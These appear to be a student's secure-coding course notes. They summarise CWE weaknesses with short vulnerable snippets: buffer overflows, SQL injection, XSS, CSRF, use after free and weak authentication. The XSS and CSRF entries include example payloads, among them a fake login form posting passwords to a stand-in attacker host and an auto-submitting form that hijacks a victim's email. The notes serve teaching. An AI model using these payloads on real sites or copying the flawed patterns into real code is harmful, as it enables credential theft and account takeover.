# Secure Code

> Authentication and access control methods. Biometric authentication methods, their implications and problems. Electronic signature and its use. Authentication of machines and applications. Principles and principles of secure code. Typical code-level security vulnerabilities, concurrency, input treatment. Security vulnerability detection, penetration testing. Practical examples for all of the above. (PV157, PA193, PV276)

[PV157 prednasky](https://is.muni.cz/auth/el/fi/podzim2022/PV157/um/)

## Glossary

### Common Weaknesses Enumeration examples

[CWE link](https://cwe.mitre.org/data/definitions/787.html)

#### Out-of-bounds Write

The product writes data past the end, or before the beginning, of the intended buffer

**Result:**

- corruption of data, a crash, a code execition
- write operation may produce undefined or unexpected results

**Examples:**

attempts to save four different identification numbers into an array:

```c
int id_sequence[3];

id_sequence[0] = 123;
id_sequence[1] = 234;
id_sequence[2] = 345;
id_sequence[3] = 456; // 3 is out of bound
```

**^^ Problem:** `id_sequence[3] is out of bounds`

takes an IP address from the user and verifies that it is well formed. It then looks up the hostname and copies it into a buffer:

```c
struct hostent *hp;
char hostname[64];

hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);
strcpy(hostname, hp->h_name);
```

**^^ Problem:** function allocates a buffer of 64 bytes to store the hostname. However, there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker

**Related to:**

- [Off-by-one Error](https://cwe.mitre.org/data/definitions/193.html)

#### Out-of-bounds Read

The product reads data past the end, or before the beginning, of the intended buffer

**Result:**

- By reading out-of-bounds memory, an attacker might be able to get secret values, such as memory addresses, which can be bypass protection mechanisms

**Examples:**

```c
int getValueFromArray(int *array, int len, int index) {
    int value;
    // check that the array index is less than the maximum
    // length of the array
    if (index < len) {
    // get the value at the specified index of the array
        value = array[index];
    }
    // if array index is invalid then output error message
    // and return value indicating error
    else {
        printf("Value is: %d\n", array[index]);
        value = -1;
    }
    return value;
}
```

**^^ Problem:** the array but does not check for the minimum value. This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read and may allow access to sensitive memory

**Related to:**

- [Numeric Range Comparison Without Minimum Check](https://cwe.mitre.org/data/definitions/839.html)

#### SQL Injection

The product constructs all or part of an SQL command using externally-influenced input, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.

**Result:**

- It can be used to alter query logic to bypass security checks, or to insert additional statements that modify the back-end database, possibly including execution of system commands

**Examples:**

```c#
string query = "SELECT * FROM items WHERE owner = '" + userName + "' AND itemname = '" + ItemName.Text + "'";
```

**^^ Problem:** Query is constructed dynamically and the attacker can use `OR 'a'='a` in the end of the SQL command - resukts in `WHERE` clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:

```sql
SELECT * FROM items;
```

#### Cross-site Scripting

The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.

**Result:**

- Once the malicious script is injected, the attacker can perform a variety of malicious activities:
  - transfer private information (cookies)
  - attacker can send malicious requests to a web site on behalf of the victim

**Examples:**

```php
$username = $_GET['username'];
echo '<div class="header"> Welcome, ' . $username . '</div>';
```

**^^ Problem:** The input can contain a scripting syntax after the mandatory URL `http://trustedSite.example.com/welcome.php?username=`

```html
<script language="Javascript">
  alert("You've been attacked!");
</script>
```

OR

```html
<div id="stealPassword">
  Please Login:
  <form
    name="input"
    action="http://attack.example.com/stealPassword.php"
    method="post"
  >
    Username: <input type="text" name="username" /><br />Password:
    <input type="password" name="password" /><br /><input
      type="submit"
      value="Login"
    />
  </form>
</div>
```

#### Cross-Site Request Forgery (CSRF)

The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.

**Result:**

- It might be possible for an attacker to trick a client into making an unintentional request to the web server which will be treated as an authentic request

**Examples:**

```html
<form action="/url/profile.php" method="post">
  <input type="text" name="firstname" />
  <input type="text" name="lastname" />
  <br />
  <input type="text" name="email" />
  <input type="submit" name="submit" value="Update" />
</form>
```

```php
// initiate the session in order to validate sessions
session_start();

if (! session_is_registered("username")) {
    echo "invalid session detected!";
    // Redirect user to login page
}

function update_profile {
    // read in the data from $POST and send an update
    // to the database
    SendUpdateToDatabase($_SESSION['username'], $_POST['email']);
    [...]
    echo "Your profile has been successfully updated.";
}

update_profile();
```

**^^ Problem:**

```html
<script>
  function SendAttack() {
    form.email = "attacker@example.com";
    // send to profile.php
    form.submit();
  }
</script>

<body onload="javascript:SendAttack();"></body>

<form action="http://victim.example.com/profile.php" id="form" method="post">
  <input type="hidden" name="firstname" value="Funny" />
  <input type="hidden" name="lastname" value="Joke" />
  <br />
  <input type="hidden" name="email" />
</form>
```

#### Use After Free

Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code

**Result:**

- If malicious data is entered before chunk consolidation can take place, it may be possible to take advantage of a write-what-where primitive to execute arbitrary code.
- The process may crash when invalid data is used as chunk information

**Examples:**

```c
char* ptr = (char*)malloc (SIZE);
if (err) {
    abrt = 1;
    free(ptr);
}
...
if (abrt) {
    logError("operation aborted before commit", ptr);
}
```

**^^ Problem:** When an error occurs, the pointer is immediately freed. However, this pointer is later incorrectly used in the logError function.

#### Improper Input Validation (TLDR)

The product receives input or data, but it does not validate or incorrectly validates that the input has the properties that are required to process the data safely and correctly.

- It may result in altered control flow, arbitrary control of a resource, or arbitrary code execution

```java
public static final double price = 20.00;
int quantity = currentUser.getAttribute("quantity"); // problem!
double total = price * quantity;
chargeUser(total);
```

#### Improper Authentication (TLDR)

When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.

- It leads to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code

```perl
if ($q->cookie('loggedin') ne "true") {
    # try to login
}

if ($q->cookie('user') eq "Administrator") {
    DoAdministratorTasks();
}
```
